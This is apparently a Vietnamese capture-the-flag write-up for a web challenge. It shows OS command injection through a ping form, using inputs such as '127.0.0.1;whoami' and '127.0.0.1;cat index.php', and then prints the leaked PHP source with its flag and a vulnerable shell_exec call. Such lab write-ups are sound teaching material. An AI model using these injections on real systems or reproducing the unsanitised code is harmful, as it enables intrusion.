Khi nhập vào ip `127.0.0.1`, ta thấy chúng hiển thị giống hệt command ping của linux:

>

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.082 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.058 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.054 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.054/0.064/0.082/0.015 ms
```

Từ đó suy đoán đã có 1 hàm được gọi nhằm execute command line. Nhập  `127.0.0.1;whoami` vào input và gửi, ta thấy suy đoán của mình chính xác:

>

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.076 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.065 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.046 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.046/0.062/0.076/0.014 ms
web-serveur-ch54
```

Do gợi ý nói flag on index.php, ta chỉ việc in file index.php ra là xong, bằng cách input `127.0.0.1;cat index.php`, send request và chúng ta có nội dung php script hiện ra:

```php
<!--?php 
$flag = "S3rv1ceP1n9Sup3rS3cure";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?-->
```

